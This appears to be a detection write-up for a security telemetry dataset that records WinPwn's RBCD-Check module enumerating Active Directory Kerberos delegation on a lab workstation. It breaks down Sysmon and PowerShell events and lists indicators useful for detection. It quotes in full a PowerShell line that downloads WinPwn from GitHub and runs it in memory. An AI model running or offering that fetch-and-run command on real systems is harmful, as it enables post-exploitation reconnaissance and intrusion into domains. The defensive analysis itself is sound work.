# T1082-20: System Information Discovery — WinPwn - RBCD-Check

## Technique Context

T1082 (System Information Discovery) covers adversary enumeration of host and domain information during post-exploitation. `RBCD-Check` is a WinPwn module specifically focused on Resource-Based Constrained Delegation (RBCD) attack opportunities in Active Directory. RBCD is an Active Directory Kerberos delegation mechanism that, when misconfigured, allows an attacker who controls a computer account (or can write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of a target account) to impersonate arbitrary users to that target service — effectively gaining administrative access to systems they would not normally be able to reach.

RBCD attacks are particularly relevant in environments where an attacker has compromised a workstation or low-privilege service account and is looking for lateral movement paths to higher-value systems. The `RBCD-Check` function identifies which computer accounts in the domain have the RBCD attribute configured, which accounts can write to it, and whether any currently compromised accounts have the required privileges to set up an RBCD attack path.

This check is distinct from the general system information and privilege escalation checks in the other T1082 WinPwn modules — it targets the domain's Kerberos delegation configuration specifically, requiring domain queries rather than purely local enumeration.

## What This Dataset Contains

This dataset captures the full execution of WinPwn's `RBCD-Check` function on ACME-WS06.acme.local with Defender disabled. The execution runs as `NT AUTHORITY\SYSTEM`.

The dataset spans a 6-second window (23:32:03Z to 23:32:09Z) and captures 151 total events: 37 sysmon, 4 security, 109 PowerShell, and 1 application.

The Sysmon EID 1 event captures the complete invocation:

```
"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
RBCD-Check -consoleoutput -noninteractive}
```

This execution as SYSTEM on a domain-joined workstation means the RBCD-Check queries are performed in the context of the workstation's machine account (ACME-WS06$), which has read access to most Active Directory object attributes by default.

The Sysmon channel (37 events) breaks down as: 24 EID 7 (image loads), 4 EID 1 (process creates), 4 EID 10 (process access), 3 EID 17 (named pipe creates), 1 EID 11 (file create), and 1 EID 22 (DNS). This is the smallest Sysmon footprint in the T1082 WinPwn series, reflecting that RBCD-Check performs primarily domain LDAP queries rather than local file system or process enumeration.

The EID 7 (image load) events include several notable DLLs loaded into the PowerShell process:

- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26010.5-0\MpClient.dll` — Defender client library
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26010.5-0\MpOAV.dll` — Defender on-access verification
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll` — .NET Common Language Runtime
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll` — .NET JIT compiler
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll` — .NET Runtime Execution Engine
- `C:\Windows\System32\mscoree.dll` — .NET Runtime host
- `C:\Windows\System32\urlmon.dll` — URL moniker/download manager

The presence of `urlmon.dll` is significant: this is the Windows URL download component, which is loaded when PowerShell (or a .NET application) makes HTTP/HTTPS connections. Its loading confirms that the WinPwn download from GitHub (via `downloadstring`) used `urlmon.dll` infrastructure, corroborating the in-memory loading pattern.

The EID 10 (process access) events show PowerShell opening both `whoami.exe` and another PowerShell process (`powershell.exe`) with `PROCESS_ALL_ACCESS (0x1FFFFF)`. The self-referential PowerShell→PowerShell access is notable: RBCD-Check may spawn a sub-shell for domain queries and then access it to retrieve results.

Sysmon EID 17 records three PowerShell host pipes under SYSTEM — more than most other T1082 tests. Three PSHost pipes in 6 seconds suggests RBCD-Check spawns at least two subordinate PowerShell sessions for its domain query operations.

The Security channel has only 4 EID 4688 events — the smallest Security footprint in the T1082 series. This reflects that RBCD-Check operates primarily via LDAP/Active Directory queries rather than spawning child processes.

Compared to the defended dataset (31 sysmon, 10 security, 51 PowerShell events), this undefended capture has more Sysmon activity (37 vs. 31) and fewer Security events (4 vs. 10). The reduced Security log activity in the undefended run is likely because Defender's interference in the defended run generated additional Security events (from Defender's own process activity), while the undefended run shows only the tool's own minimal process creation.

## What This Dataset Does Not Contain

The RBCD delegation results — which Active Directory computer accounts are configured for RBCD, which accounts can modify the delegation attribute, and whether any current account privileges enable an RBCD attack path — are console output only.

The domain LDAP queries performed by RBCD-Check are not visible in Windows event telemetry on the workstation. LDAP query logging would appear on the domain controller (ACME-DC01) rather than on the workstation. This dataset captures only the workstation-side telemetry.

No network connection events (EID 3) to the domain controller or DNS server are captured in the samples, though such connections would occur as part of the LDAP queries to AD.

## Assessment

RBCD-Check produces the most domain-targeted and the smallest local-footprint activity among the T1082 WinPwn modules. Its minimal Security EID 4688 count (4 events) contrasts with itm4nprivesc (62) and Morerecon (50) precisely because RBCD-Check does its work through LDAP queries to Active Directory rather than spawning local processes to check file and service permissions.

The loading of `urlmon.dll` into the PowerShell process is a discriminating indicator from the EID 7 events: it confirms the in-memory download used the URL moniker stack (the same infrastructure used by Internet Explorer and legacy download APIs), which is distinct from the .NET `HttpClient`-based approach. This can help attribute the download mechanism used by WinPwn's in-memory loading pattern.

The three PSHost pipe creations (EID 17) in 6 seconds, combined with the PowerShell→PowerShell process access (EID 10), indicate that RBCD-Check spawned at least two sub-sessions for its domain enumeration work — an architectural detail that distinguishes it from simpler single-process modules.

The dataset represents the endpoint-visible telemetry of a domain Kerberos delegation audit performed by an offensive framework. The domain controller would see the corresponding LDAP queries, but from the workstation's perspective, the observable indicators are the in-memory PowerShell loading pattern and the sub-session spawning behavior.

## Detection Opportunities Present in This Data

**Sysmon EID 1 — RBCD-Check WinPwn invocation with complete command line:** The full command line including `RBCD-Check -consoleoutput -noninteractive` and the WinPwn GitHub URL is captured. This is the most specific indicator of intent — RBCD-Check's function is AD delegation auditing, which is not a legitimate administrative operation performed by workstation users or standard IT automation.

**Sysmon EID 7 — urlmon.dll loaded into PowerShell:** The presence of `urlmon.dll` in the PowerShell process's loaded module list confirms that the in-memory download used the legacy URL moniker download stack. Combined with the WinPwn invocation in the command line, this provides a download method fingerprint.

**Sysmon EID 7 — MpClient.dll / MpOAV.dll loaded into PowerShell:** As in GeneralRecon (T1082-18), Defender's client DLLs being loaded into a non-Defender PowerShell process indicates active security product enumeration. RBCD-Check's WinPwn preamble includes security product status checks.

**Sysmon EID 10 — PowerShell accessing another PowerShell process with PROCESS_ALL_ACCESS:** A PowerShell process opening a subordinate PowerShell process with full access rights (`0x1FFFFF`) is anomalous. This pattern is consistent with a framework module that controls sub-sessions through a parent process handle rather than standard parent-child communication.

**Sysmon EID 17 — Three named pipe creates in 6 seconds under SYSTEM:** Multiple PSHost pipes created within a very short window indicates rapid sub-session spawning, consistent with a module that parallelizes enumeration across independent PowerShell contexts.

**Cross-campaign correlation — Same commit hash as T1082-14 through T1082-19:** The WinPwn commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` and the `iex(downloadstring(...))` pattern are shared across all seven T1082 WinPwn tests. RBCD-Check appearing in the same execution session as winPEAS, itm4nprivesc, oldchecks, otherchecks, GeneralRecon, and Morerecon is characteristic of a structured post-exploitation enumeration campaign where an attacker systematically works through an offensive framework's enumeration capability set.
